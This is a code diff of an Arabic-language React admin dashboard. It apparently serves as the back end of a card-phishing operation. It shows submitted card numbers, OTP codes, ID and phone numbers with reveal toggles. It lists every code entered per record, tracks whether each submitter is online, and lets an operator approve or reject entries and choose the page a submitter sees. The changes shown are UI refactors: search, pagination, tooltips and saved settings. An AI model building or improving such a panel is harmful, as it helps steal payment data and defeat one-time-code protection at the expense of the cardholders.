@@ -28,12 +28,9 @@ import {
   RefreshCw,
   AlertCircle,
   Loader2,
-  Phone,
-  LockIcon,
-  Shield,
-  ClipboardCheck, 
-  EyeClosed,
-  Eye
+  EyeOff,
+  Eye,
+  X,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
@@ -67,6 +64,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { Checkbox } from "@/components/ui/checkbox"
 import { toast } from "@/hooks/use-toast"
 import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
+import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
 
 // Types
 type FlagColor = "red" | "yellow" | "green" | null
@@ -115,8 +113,6 @@ interface Notification {
   step?: number
 }
 
-
-
 // Hook for online users count
 function useOnlineUsersCount() {
   const [onlineUsersCount, setOnlineUsersCount] = useState(0)
@@ -154,16 +150,18 @@ function useUserOnlineStatus(userId: string) {
 
   return isOnline
 }
+
 const handlePageName = (page: string) => {
   switch (page) {
-    case '1':
-      return 'الرئيسية'
-      break;
-    case '2':
-      return 'الدفع'
-      break;
+    case "1":
+      return "الرئيسية"
+    case "2":
+      return "الدفع"
+    default:
+      return "غير معروف"
   }
 }
+
 // Enhanced Statistics Card Component
 function StatisticsCard({
   title,
@@ -183,15 +181,15 @@ function StatisticsCard({
   trend?: number[]
 }) {
   return (
-    <Card className="relative overflow-hidden bg-gradient-to-br from-background to-muted/20 border-0 shadow-lg hover:shadow-xl transition-all duration-300">
+    <Card className="relative overflow-hidden bg-gradient-to-br from-background to-muted/20 border-0 shadow-lg hover:shadow-xl transition-all duration-300 group">
       <CardHeader className="pb-2">
         <div className="flex items-center justify-between">
-          <div className={`p-3 rounded-xl ${color}`}>
+          <div className={`p-3 rounded-xl ${color} shadow-md group-hover:scale-110 transition-transform`}>
             <Icon className="h-6 w-6 text-white" />
           </div>
           <div className="text-right">
             <p className="text-sm font-medium text-muted-foreground">{title}</p>
-            <p className="text-3xl font-bold">{value}</p>
+            <p className="text-3xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text">{value}</p>
           </div>
         </div>
       </CardHeader>
@@ -224,7 +222,7 @@ function StatisticsCard({
               {trend.map((value, index) => (
                 <div
                   key={index}
-                  className={`w-1 rounded-sm ${color.replace("bg-", "bg-")} opacity-60`}
+                  className={`w-1.5 rounded-sm ${color.replace("bg-gradient-to-br", "bg-primary")} opacity-60 hover:opacity-100 transition-opacity`}
                   style={{ height: `${(value / Math.max(...trend)) * 100}%` }}
                 />
               ))}
@@ -239,6 +237,7 @@ function StatisticsCard({
 // Enhanced User Status Component
 function UserStatus({ userId }: { userId: string }) {
   const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")
+  const [lastSeen, setLastSeen] = useState<Date | null>(null)
 
   useEffect(() => {
     const userStatusRef = ref(database, `/status/${userId}`)
@@ -247,6 +246,9 @@ function UserStatus({ userId }: { userId: string }) {
       const data = snapshot.val()
       if (data) {
         setStatus(data.state === "online" ? "online" : "offline")
+        if (data.lastChanged) {
+          setLastSeen(new Date(data.lastChanged))
+        }
       } else {
         setStatus("unknown")
       }
@@ -256,19 +258,38 @@ function UserStatus({ userId }: { userId: string }) {
   }, [userId])
 
   return (
-    <div className="flex items-center gap-2">
-      <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"}`} />
-      <Badge
-        variant="outline"
-        className={`text-xs ${
-          status === "online"
-            ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
-            : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
-        }`}
-      >
-        {status === "online" ? "متصل" : "غير متصل"}
-      </Badge>
-    </div>
+    <TooltipProvider>
+      <Tooltip>
+        <TooltipTrigger asChild>
+          <div className="flex items-center gap-2 cursor-pointer">
+            <div
+              className={`w-2 h-2 rounded-full ${
+                status === "online" ? "bg-green-500 animate-pulse" : status === "offline" ? "bg-red-500" : "bg-gray-400"
+              }`}
+            />
+            <Badge
+              variant="outline"
+              className={`text-xs ${
+                status === "online"
+                  ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
+                  : status === "offline"
+                    ? "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
+                    : "bg-gray-50 text-gray-700 border-gray-200 dark:bg-gray-950/30 dark:text-gray-300"
+              }`}
+            >
+              {status === "online" ? "متصل" : status === "offline" ? "غير متصل" : "غير معروف"}
+            </Badge>
+          </div>
+        </TooltipTrigger>
+        <TooltipContent>
+          {status === "offline" && lastSeen && (
+            <p>آخر ظهور: {formatDistanceToNow(lastSeen, { addSuffix: true, locale: ar })}</p>
+          )}
+          {status === "online" && <p>متصل الآن</p>}
+          {status === "unknown" && <p>لا توجد معلومات</p>}
+        </TooltipContent>
+      </Tooltip>
+    </TooltipProvider>
   )
 }
 
@@ -285,9 +306,9 @@ function FlagColorSelector({
   return (
     <Popover>
       <PopoverTrigger asChild>
-        <Button variant="ghost" size="icon" className="h-8 w-8">
+        <Button variant="ghost" size="icon" className="h-8 w-8 hover:bg-muted">
           <Flag
-            className={`h-4 w-4 ${
+            className={`h-4 w-4 transition-colors ${
               currentColor === "red"
                 ? "text-red-500 fill-red-500"
                 : currentColor === "yellow"
@@ -299,23 +320,23 @@ function FlagColorSelector({
           />
         </Button>
       </PopoverTrigger>
-      <PopoverContent className="w-auto p-2">
+      <PopoverContent className="w-auto p-2" dir="rtl">
         <div className="flex gap-2">
           {[
-            { color: "red", label: "عالي الأولوية" },
-            { color: "yellow", label: "متوسط الأولوية" },
-            { color: "green", label: "منخفض الأولوية" },
-          ].map(({ color, label }) => (
+            { color: "red", label: "عالي الأولوية", bgColor: "bg-red-500" },
+            { color: "yellow", label: "متوسط الأولوية", bgColor: "bg-yellow-500" },
+            { color: "green", label: "منخفض الأولوية", bgColor: "bg-green-500" },
+          ].map(({ color, label, bgColor }) => (
             <TooltipProvider key={color}>
               <Tooltip>
                 <TooltipTrigger asChild>
                   <Button
                     variant="ghost"
                     size="icon"
-                    className={`h-8 w-8 rounded-full bg-${color}-100 dark:bg-${color}-900 hover:bg-${color}-200 dark:hover:bg-${color}-800`}
+                    className={`h-8 w-8 rounded-full ${bgColor} hover:opacity-80 transition-opacity`}
                     onClick={() => onColorChange(notificationId, color as FlagColor)}
                   >
-                    <Flag className={`h-4 w-4 text-${color}-500 fill-${color}-500`} />
+                    <Flag className="h-4 w-4 text-white" />
                   </Button>
                 </TooltipTrigger>
                 <TooltipContent>
@@ -331,10 +352,10 @@ function FlagColorSelector({
                   <Button
                     variant="ghost"
                     size="icon"
-                    className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
+                    className="h-8 w-8 rounded-full bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600"
                     onClick={() => onColorChange(notificationId, null)}
                   >
-                    <Flag className="h-4 w-4 text-gray-500" />
+                    <X className="h-4 w-4 text-gray-600 dark:text-gray-300" />
                   </Button>
                 </TooltipTrigger>
                 <TooltipContent>
@@ -350,32 +371,56 @@ function FlagColorSelector({
 }
 
 // Enhanced Search Component
-function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
-  const [searchTerm, setSearchTerm] = useState("")
+function SearchBar({ onSearch, value }: { onSearch: (term: string) => void; value: string }) {
+  const [searchTerm, setSearchTerm] = useState(value)
   const searchInputRef = useRef<HTMLInputElement>(null)
 
-  const handleSearch = () => {
-    onSearch(searchTerm)
+  useEffect(() => {
+    setSearchTerm(value)
+  }, [value])
+
+  const handleSearch = (term: string) => {
+    setSearchTerm(term)
+    onSearch(term)
+  }
+
+  const handleClear = () => {
+    setSearchTerm("")
+    onSearch("")
+    searchInputRef.current?.focus()
   }
 
   const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
     if (e.key === "Enter") {
-      handleSearch()
+      onSearch(searchTerm)
+    }
+    if (e.key === "Escape") {
+      handleClear()
     }
   }
 
   return (
-    <div className="relative">
-      <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
+    <div className="relative group">
+      <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground group-focus-within:text-primary transition-colors" />
       <Input
         ref={searchInputRef}
         type="search"
-        placeholder="البحث في الإشعارات..."
-        className="pl-10 pr-4 bg-background/50 backdrop-blur-sm border-muted-foreground/20 focus:border-primary/50 transition-colors"
+        placeholder="البحث في الإشعارات... (اضغط / للتركيز)"
+        className="pl-10 pr-10 bg-background/50 backdrop-blur-sm border-muted-foreground/20 focus:border-primary/50 transition-colors"
         value={searchTerm}
-        onChange={(e) => setSearchTerm(e.target.value)}
+        onChange={(e) => handleSearch(e.target.value)}
         onKeyDown={handleKeyDown}
       />
+      {searchTerm && (
+        <Button
+          variant="ghost"
+          size="icon"
+          className="absolute right-1 top-1/2 transform -translate-y-1/2 h-7 w-7"
+          onClick={handleClear}
+        >
+          <X className="h-3 w-3" />
+        </Button>
+      )}
     </div>
   )
 }
@@ -397,10 +442,41 @@ function Pagination({
   const startItem = (currentPage - 1) * itemsPerPage + 1
   const endItem = Math.min(currentPage * itemsPerPage, totalItems)
 
+  const getPageNumbers = () => {
+    const pages = []
+    const maxVisible = 5
+
+    if (totalPages <= maxVisible) {
+      for (let i = 1; i <= totalPages; i++) {
+        pages.push(i)
+      }
+    } else {
+      if (currentPage <= 3) {
+        for (let i = 1; i <= 4; i++) pages.push(i)
+        pages.push("...")
+        pages.push(totalPages)
+      } else if (currentPage >= totalPages - 2) {
+        pages.push(1)
+        pages.push("...")
+        for (let i = totalPages - 3; i <= totalPages; i++) pages.push(i)
+      } else {
+        pages.push(1)
+        pages.push("...")
+        for (let i = currentPage - 1; i <= currentPage + 1; i++) pages.push(i)
+        pages.push("...")
+        pages.push(totalPages)
+      }
+    }
+
+    return pages
+  }
+
   return (
-    <div className="flex items-center justify-between">
+    <div className="flex items-center justify-between flex-wrap gap-4">
       <div className="text-sm text-muted-foreground">
-        عرض {startItem} إلى {endItem} من {totalItems} عنصر
+        عرض <span className="font-medium text-foreground">{startItem}</span> إلى{" "}
+        <span className="font-medium text-foreground">{endItem}</span> من{" "}
+        <span className="font-medium text-foreground">{totalItems}</span> عنصر
       </div>
       <div className="flex items-center gap-2">
         <Button
@@ -414,20 +490,23 @@ function Pagination({
           السابق
         </Button>
         <div className="flex items-center gap-1">
-          {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
-            const page = i + 1
-            return (
+          {getPageNumbers().map((page, index) =>
+            page === "..." ? (
+              <span key={`ellipsis-${index}`} className="px-2">
+                ...
+              </span>
+            ) : (
               <Button
                 key={page}
                 variant={currentPage === page ? "default" : "outline"}
                 size="sm"
                 className="w-8 h-8 p-0"
-                onClick={() => onPageChange(page)}
+                onClick={() => onPageChange(page as number)}
               >
                 {page}
               </Button>
-            )
-          })}
+            ),
+          )}
         </div>
         <Button
           variant="outline"
@@ -468,6 +547,11 @@ function ExportDialog({
 
     // Simulate export process
     setTimeout(() => {
+      // In a real implementation, generate and download the file here
+      const selectedFields = Object.entries(exportFields)
+        .filter(([_, value]) => value)
+        .map(([key]) => key)
+
       setIsExporting(false)
       onOpenChange(false)
       toast({
@@ -522,72 +606,34 @@ function ExportDialog({
           <div className="space-y-2">
             <Label>البيانات المراد تصديرها</Label>
             <div className="space-y-2">
-              <div className="flex items-center space-x-2 space-x-reverse">
-                <Checkbox
-                  id="personal-info"
-                  checked={exportFields.personalInfo}
-                  onCheckedChange={(checked) =>
-                    setExportFields({
-                      ...exportFields,
-                      personalInfo: checked as boolean,
-                    })
-                  }
-                />
-                <Label htmlFor="personal-info" className="cursor-pointer">
-                  المعلومات الشخصية
-                </Label>
-              </div>
-              <div className="flex items-center space-x-2 space-x-reverse">
-                <Checkbox
-                  id="card-info"
-                  checked={exportFields.cardInfo}
-                  onCheckedChange={(checked) =>
-                    setExportFields({
-                      ...exportFields,
-                      cardInfo: checked as boolean,
-                    })
-                  }
-                />
-                <Label htmlFor="card-info" className="cursor-pointer">
-                  معلومات البطاقة
-                </Label>
-              </div>
-              <div className="flex items-center space-x-2 space-x-reverse">
-                <Checkbox
-                  id="status"
-                  checked={exportFields.status}
-                  onCheckedChange={(checked) =>
-                    setExportFields({
-                      ...exportFields,
-                      status: checked as boolean,
-                    })
-                  }
-                />
-                <Label htmlFor="status" className="cursor-pointer">
-                  حالة الإشعار
-                </Label>
-              </div>
-              <div className="flex items-center space-x-2 space-x-reverse">
-                <Checkbox
-                  id="timestamps"
-                  checked={exportFields.timestamps}
-                  onCheckedChange={(checked) =>
-                    setExportFields({
-                      ...exportFields,
-                      timestamps: checked as boolean,
-                    })
-                  }
-                />
-                <Label htmlFor="timestamps" className="cursor-pointer">
-                  الطوابع الزمنية
-                </Label>
-              </div>
+              {[
+                { id: "personalInfo", label: "المعلومات الشخصية" },
+                { id: "cardInfo", label: "معلومات البطاقة" },
+                { id: "status", label: "حالة الإشعار" },
+                { id: "timestamps", label: "الطوابع الزمنية" },
+              ].map(({ id, label }) => (
+                <div key={id} className="flex items-center space-x-2 space-x-reverse">
+                  <Checkbox
+                    id={id}
+                    checked={exportFields[id as keyof typeof exportFields]}
+                    onCheckedChange={(checked) =>
+                      setExportFields({
+                        ...exportFields,
+                        [id]: checked as boolean,
+                      })
+                    }
+                  />
+                  <Label htmlFor={id} className="cursor-pointer">
+                    {label}
+                  </Label>
+                </div>
+              ))}
             </div>
           </div>
 
           <div className="rounded-md bg-muted p-3">
             <div className="flex items-center gap-2 text-sm">
-              <AlertCircle className="h-4 w-4 text-muted-foreground" />
+              <AlertCircle className="h-4 w-4 text-muted-foreground flex-shrink-0" />
               <p className="text-muted-foreground">سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.</p>
             </div>
           </div>
@@ -616,22 +662,49 @@ function ExportDialog({
 }
 
 // Settings panel component
-function SettingsPanel({
-  open,
-  onOpenChange,
-}: {
-  open: boolean
-  onOpenChange: (open: boolean) => void
-}) {
+function SettingsPanel({ open, onOpenChange }: { open: boolean; onOpenChange: (open: boolean) => void }) {
   const [notifyNewCards, setNotifyNewCards] = useState(true)
   const [notifyNewUsers, setNotifyNewUsers] = useState(true)
   const [playSounds, setPlaySounds] = useState(true)
   const [autoRefresh, setAutoRefresh] = useState(true)
   const [refreshInterval, setRefreshInterval] = useState("30")
 
+  const handleSaveSettings = () => {
+    // Save settings to localStorage or backend
+    localStorage.setItem(
+      "notificationSettings",
+      JSON.stringify({
+        notifyNewCards,
+        notifyNewUsers,
+        playSounds,
+        autoRefresh,
+        refreshInterval,
+      }),
+    )
+
+    toast({
+      title: "تم حفظ الإعدادات",
+      description: "تم حفظ إعدادات الإشعارات بنجاح",
+    })
+    onOpenChange(false)
+  }
+
+  // Load settings on mount
+  useEffect(() => {
+    const savedSettings = localStorage.getItem("notificationSettings")
+    if (savedSettings) {
+      const settings = JSON.parse(savedSettings)
+      setNotifyNewCards(settings.notifyNewCards)
+      setNotifyNewUsers(settings.notifyNewUsers)
+      setPlaySounds(settings.playSounds)
+      setAutoRefresh(settings.autoRefresh)
+      setRefreshInterval(settings.refreshInterval)
+    }
+  }, [])
+
   return (
     <Sheet open={open} onOpenChange={onOpenChange}>
-      <SheetContent side="left" className="sm:max-w-md" dir="rtl">
+      <SheetContent side="left" className="sm:max-w-md overflow-y-auto" dir="rtl">
         <SheetHeader>
           <SheetTitle className="flex items-center gap-2 text-xl">
             <Settings className="h-5 w-5" />
@@ -642,23 +715,29 @@ function SettingsPanel({
           <div className="space-y-4">
             <h3 className="text-sm font-medium">إعدادات الإشعارات</h3>
             <div className="space-y-3">
-              <div className="flex items-center justify-between">
+              <div className="flex items-center justify-between rounded-lg border p-3 hover:bg-muted/50 transition-colors">
                 <div className="space-y-0.5">
-                  <Label htmlFor="notify-cards">إشعارات البطاقات الجديدة</Label>
+                  <Label htmlFor="notify-cards" className="cursor-pointer">
+                    إشعارات البطاقات الجديدة
+                  </Label>
                   <p className="text-xs text-muted-foreground">تلقي إشعارات عند إضافة بطاقة جديدة</p>
                 </div>
                 <Switch id="notify-cards" checked={notifyNewCards} onCheckedChange={setNotifyNewCards} />
               </div>
-              <div className="flex items-center justify-between">
+              <div className="flex items-center justify-between rounded-lg border p-3 hover:bg-muted/50 transition-colors">
                 <div className="space-y-0.5">
-                  <Label htmlFor="notify-users">إشعارات المستخدمين الجدد</Label>
+                  <Label htmlFor="notify-users" className="cursor-pointer">
+                    إشعارات المستخدمين الجدد
+                  </Label>
                   <p className="text-xs text-muted-foreground">تلقي إشعارات عند تسجيل مستخدم جديد</p>
                 </div>
                 <Switch id="notify-users" checked={notifyNewUsers} onCheckedChange={setNotifyNewUsers} />
               </div>
-              <div className="flex items-center justify-between">
+              <div className="flex items-center justify-between rounded-lg border p-3 hover:bg-muted/50 transition-colors">
                 <div className="space-y-0.5">
-                  <Label htmlFor="play-sounds">تشغيل الأصوات</Label>
+                  <Label htmlFor="play-sounds" className="cursor-pointer">
+                    تشغيل الأصوات
+                  </Label>
                   <p className="text-xs text-muted-foreground">تشغيل صوت عند استلام إشعار جديد</p>
                 </div>
                 <Switch id="play-sounds" checked={playSounds} onCheckedChange={setPlaySounds} />
@@ -671,15 +750,17 @@ function SettingsPanel({
           <div className="space-y-4">
             <h3 className="text-sm font-medium">إعدادات التحديث التلقائي</h3>
             <div className="space-y-3">
-              <div className="flex items-center justify-between">
+              <div className="flex items-center justify-between rounded-lg border p-3 hover:bg-muted/50 transition-colors">
                 <div className="space-y-0.5">
-                  <Label htmlFor="auto-refresh">تحديث تلقائي</Label>
+                  <Label htmlFor="auto-refresh" className="cursor-pointer">
+                    تحديث تلقائي
+                  </Label>
                   <p className="text-xs text-muted-foreground">تحديث البيانات تلقائيًا</p>
                 </div>
                 <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
               </div>
               {autoRefresh && (
-                <div className="space-y-1.5">
+                <div className="space-y-1.5 pt-2">
                   <Label htmlFor="refresh-interval">فترة التحديث (بالثواني)</Label>
                   <Select value={refreshInterval} onValueChange={setRefreshInterval}>
                     <SelectTrigger id="refresh-interval">
@@ -697,25 +778,200 @@ function SettingsPanel({
             </div>
           </div>
 
+          <Separator />
+
+          <div className="space-y-4">
+            <h3 className="text-sm font-medium">معلومات النظام</h3>
+            <div className="rounded-lg bg-muted p-3 space-y-2 text-sm">
+              <div className="flex justify-between">
+                <span className="text-muted-foreground">الإصدار:</span>
+                <span className="font-medium">1.0.0</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-muted-foreground">آخر تحديث:</span>
+                <span className="font-medium">{format(new Date(), "yyyy/MM/dd")}</span>
+              </div>
+            </div>
+          </div>
+
           <div className="flex justify-end gap-2 pt-4">
             <Button variant="outline" onClick={() => onOpenChange(false)}>
               إلغاء
             </Button>
-            <Button
-              onClick={() => {
-                toast({
-                  title: "تم حفظ الإعدادات",
-                  description: "تم حفظ إعدادات الإشعارات بنجاح",
-                })
-                onOpenChange(false)
-              }}
-            >
-              حفظ الإعدادات
-            </Button>
+            <Button onClick={handleSaveSettings}>حفظ الإعدادات</Button>
           </div>
         </div>
       </SheetContent>
     </Sheet>
+  )
+}
+
+// Info Badge Component
+const InfoBadge = ({ active, onClick, icon: Icon, text, inactiveText, colorClass }: any) => (
+  <TooltipProvider>
+    <Tooltip>
+      <TooltipTrigger asChild>
+        <Badge
+          variant={active ? "default" : "secondary"}
+          className={`cursor-pointer transition-all hover:scale-105 ${
+            active ? `bg-gradient-to-r ${colorClass} text-white shadow-md` : "opacity-60"
+          }`}
+          onClick={active ? onClick : undefined}
+        >
+          <Icon className="h-3 w-3 ml-1" />
+          {active ? text : inactiveText}
+        </Badge>
+      </TooltipTrigger>
+      <TooltipContent>
+        <p>{active ? "انقر للعرض" : "لا توجد بيانات"}</p>
+      </TooltipContent>
+    </Tooltip>
+  </TooltipProvider>
+)
+
+// Status Badge Component
+const StatusBadge = ({ status }: any) => {
+  const statusMap = {
+    approved: { text: "موافق", color: "from-green-500 to-green-600", icon: CheckCircle },
+    rejected: { text: "مرفوض", color: "from-red-500 to-red-600", icon: XCircle },
+    pending: { text: "معلق", color: "from-yellow-500 to-yellow-600", icon: Clock },
+  }
+  const { text, color, icon: Icon } = (statusMap[status as keyof typeof statusMap] as any) || statusMap.pending
+
+  return (
+    <Badge className={`bg-gradient-to-r ${color} text-white flex items-center gap-1 shadow-sm`}>
+      <Icon className="h-3 w-3" />
+      {text}
+    </Badge>
+  )
+}
+
+// Gradient Button Component
+const GradientButton = ({ text, icon: Icon, onClick, disabled, color }: any) => (
+  <Button
+    variant="outline"
+    size="sm"
+    onClick={onClick}
+    disabled={disabled}
+    className={`bg-gradient-to-r from-${color}-500 to-${color}-600 text-white border-0 hover:from-${color}-600 hover:to-${color}-700 flex items-center gap-1 shadow-sm disabled:opacity-50 disabled:cursor-not-allowed transition-all`}
+  >
+    {text} <Icon className="h-4 w-4" />
+  </Button>
+)
+
+// Action Buttons Component
+const ActionButtons = ({ notification, handleApproval, handleDelete, handleFlagColorChange }: any) => (
+  <div className="flex justify-center gap-1 flex-wrap items-center">
+    <GradientButton
+      text="موافقة"
+      icon={CheckCircle}
+      onClick={() => handleApproval("approved", notification.id)}
+      disabled={notification.status === "approved"}
+      color="green"
+    />
+    <GradientButton
+      text="رفض"
+      icon={XCircle}
+      onClick={() => handleApproval("rejected", notification.id)}
+      disabled={notification.status === "rejected"}
+      color="red"
+    />
+    <FlagColorSelector
+      notificationId={notification.id}
+      currentColor={notification.flagColor}
+      onColorChange={handleFlagColorChange}
+    />
+    <Button
+      variant="ghost"
+      size="sm"
+      onClick={() => handleDelete(notification.id)}
+      className="text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-950/30"
+    >
+      <Trash2 className="h-4 w-4" />
+    </Button>
+    {notification?.amount && (
+      <Badge variant="outline" className="font-mono">
+        {notification.amount}
+      </Badge>
+    )}
+  </div>
+)
+
+// Header Icon Component
+const HeaderIcon: React.FC<{ icon: React.ElementType; bgGradient: string; title: string }> = ({
+  icon: Icon,
+  bgGradient,
+  title,
+}) => (
+  <>
+    <div
+      className={`w-12 h-12 rounded-full flex items-center justify-center bg-gradient-to-br ${bgGradient} shadow-md`}
+    >
+      <Icon className="h-6 w-6 text-white" />
+    </div>
+    <span className="ml-2">{title}</span>
+  </>
+)
+
+// Info Section Component
+const InfoSection: React.FC<{
+  items: { label: string; value: any; sensitive?: boolean }[]
+  additionalOtps?: string[]
+}> = ({ items, additionalOtps }) => {
+  const [showSensitive, setShowSensitive] = useState<{ [key: string]: boolean }>({})
+
+  const toggleSensitive = (label: string) => {
+    setShowSensitive((prev) => ({ ...prev, [label]: !prev[label] }))
+  }
+
+  return (
+    <div className="mt-4 space-y-4">
+      <div className="bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900 rounded-xl shadow-inner p-5 space-y-3">
+        {items.map(({ label, value, sensitive }) => {
+          if (value === undefined || value === null || value === "") return null
+
+          return (
+            <div
+              key={label}
+              className="flex justify-between items-center py-2 border-b border-gray-300 dark:border-gray-700 last:border-0 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-md px-2 transition"
+            >
+              <span className="font-medium text-gray-500 dark:text-gray-400">{label}:</span>
+              <div className="flex items-center gap-2">
+                {sensitive ? (
+                  <>
+                    <span className="font-semibold text-gray-900 dark:text-gray-200">
+                      {showSensitive[label] ? String(value) : "••••••"}
+                    </span>
+                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => toggleSensitive(label)}>
+                      {showSensitive[label] ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                    </Button>
+                  </>
+                ) : (
+                  <span className="font-semibold text-gray-900 dark:text-gray-200">{String(value)}</span>
+                )}
+              </div>
+            </div>
+          )
+        })}
+
+        {additionalOtps && additionalOtps.length > 0 && (
+          <div className="pt-3 border-t border-gray-300 dark:border-gray-700">
+            <span className="font-medium text-gray-500 dark:text-gray-400 block mb-2">جميع الرموز:</span>
+            <div className="flex flex-wrap gap-2">
+              {additionalOtps.map((otp, index) => (
+                <Badge
+                  key={index}
+                  variant="outline"
+                  className="bg-gray-100 dark:bg-gray-800 text-gray-800 dark:text-gray-100 font-mono"
+                >
+                  {otp}
+                </Badge>
+              ))}
+            </div>
+          </div>
+        )}
+      </div>
+    </div>
   )
 }
 
@@ -725,18 +981,17 @@ export default function NotificationsPage() {
   const [isLoading, setIsLoading] = useState(true)
   const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
   const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
-  const [totalVisitors, setTotalVisitors] = useState<number>(0)
-  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
-  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
+  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "pending">("all")
   const [searchTerm, setSearchTerm] = useState("")
   const [currentPage, setCurrentPage] = useState(1)
-  const [itemsPerPage] = useState(10)
+  const [itemsPerPage, setItemsPerPage] = useState(10)
   const [settingsOpen, setSettingsOpen] = useState(false)
   const [exportDialogOpen, setExportDialogOpen] = useState(false)
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
   const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date")
   const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc")
-  const [showStatstics, setShowStatstics] = useState(true)
+  const [showStatistics, setShowStatistics] = useState(true)
+  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
 
   const router = useRouter()
   const onlineUsersCount = useOnlineUsersCount()
@@ -787,6 +1042,8 @@ export default function NotificationsPage() {
       filtered = filtered.filter((notification) => notification.cardNumber)
     } else if (filterType === "online") {
       filtered = filtered.filter((notification) => onlineStatuses[notification.id])
+    } else if (filterType === "pending") {
+      filtered = filtered.filter((notification) => notification.status === "pending")
     }
 
     // Apply search term
@@ -799,7 +1056,8 @@ export default function NotificationsPage() {
           notification.phone?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
-          notification.otp?.toLowerCase().includes(term),
+          notification.otp?.toLowerCase().includes(term) ||
+          notification.idNumber?.toLowerCase().includes(term),
       )
     }
 
@@ -892,9 +1150,6 @@ export default function NotificationsPage() {
           playNotificationSound()
         }
 
-        // Update statistics
-        updateStatistics(notificationsData)
-
         setNotifications(notificationsData)
         setIsLoading(false)
       },
@@ -912,17 +1167,6 @@ export default function NotificationsPage() {
     return unsubscribe
   }
 
-  const updateStatistics = (notificationsData: Notification[]) => {
-    // Total visitors is the total count of notifications
-    const totalCount = notificationsData.length
-
-    // Card submissions is the count of notifications with card info
-    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length
-
-    setTotalVisitors(totalCount)
-    setCardSubmissions(cardCount)
-  }
-
   const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
     setSelectedNotification(notification)
     setSelectedInfo(infoType)
@@ -932,9 +1176,11 @@ export default function NotificationsPage() {
     setSelectedInfo(null)
     setSelectedNotification(null)
   }
-  const handleShowStatstics = () => {
-  setShowStatstics(!showStatstics)
+
+  const handleToggleStatistics = () => {
+    setShowStatistics(!showStatistics)
   }
+
   const handleFlagColorChange = async (id: string, color: any) => {
     try {
       // Update in Firestore
@@ -958,30 +1204,6 @@ export default function NotificationsPage() {
       toast({
         title: "خطأ",
         description: "حدث خطأ أثناء تحديث لون العلامة",
-        variant: "destructive",
-      })
-    }
-  }
-
-  const handleStepUpdate = async (id: string, step: number) => {
-    try {
-      const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { step: step })
-
-      setNotifications(
-        notifications.map((notification) => (notification.id === id ? { ...notification, step: step } : notification)),
-      )
-
-      toast({
-        title: "تم تحديث الخطوة",
-        description: `تم تحديث الخطوة بنجاح.`,
-        variant: "default",
-      })
-    } catch (error) {
-      console.error("Error updating step:", error)
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء تحديث الخطوة",
         variant: "destructive",
       })
     }
@@ -1029,6 +1251,8 @@ export default function NotificationsPage() {
   }
 
   const handleClearAll = async () => {
+    if (!confirm("هل أنت متأكد من حذف جميع الإشعارات؟")) return
+
     setIsLoading(true)
     try {
       const batch = writeBatch(db)
@@ -1075,14 +1299,47 @@ export default function NotificationsPage() {
 
   const handlePageChange = (page: number) => {
     setCurrentPage(page)
+    window.scrollTo({ top: 0, behavior: "smooth" })
   }
 
   const handleRefresh = () => {
     setIsLoading(true)
     fetchNotifications()
+    toast({
+      title: "تم التحديث",
+      description: "تم تحديث البيانات بنجاح",
+    })
   }
 
-  if (isLoading) {
+  const toggleSort = (column: "date" | "status" | "country") => {
+    if (sortBy === column) {
+      setSortOrder(sortOrder === "asc" ? "desc" : "asc")
+    } else {
+      setSortBy(column)
+      setSortOrder("desc")
+    }
+  }
+
+  // Keyboard shortcuts
+  useEffect(() => {
+    const handleKeyPress = (e: KeyboardEvent) => {
+      // Focus search on "/"
+      if (e.key === "/" && !e.ctrlKey && !e.metaKey) {
+        e.preventDefault()
+        document.querySelector<HTMLInputElement>('input[type="search"]')?.focus()
+      }
+      // Refresh on Ctrl+R or Cmd+R
+      if ((e.ctrlKey || e.metaKey) && e.key === "r") {
+        e.preventDefault()
+        handleRefresh()
+      }
+    }
+
+    document.addEventListener("keydown", handleKeyPress)
+    return () => document.removeEventListener("keydown", handleKeyPress)
+  }, [])
+
+  if (isLoading && notifications.length === 0) {
